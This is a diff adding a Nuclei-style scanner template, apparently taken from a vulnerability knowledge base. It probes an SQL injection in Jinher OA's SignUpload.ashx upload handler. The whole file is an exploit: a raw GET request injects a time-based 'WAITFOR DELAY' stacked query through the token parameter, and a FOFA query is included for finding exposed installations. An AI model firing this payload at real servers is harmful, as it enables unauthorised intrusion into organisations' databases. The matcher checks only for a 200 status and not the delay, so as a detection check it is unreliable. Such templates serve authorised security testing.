@@ -1,0 +1,19 @@
+id: poc-kb3zp9cffbze2t3o
+info:
+  name: 金和OA SignUpload  SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kb3zp9cffbze2t3o'
+  tags: sqli,file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kb3zp9cffbze2t3o
+    fofa: body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || app="Jinher-OA"
+http:
+- raw:
+  - GET /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%201%27+--%20and%201=1_123_123&filename=1 HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
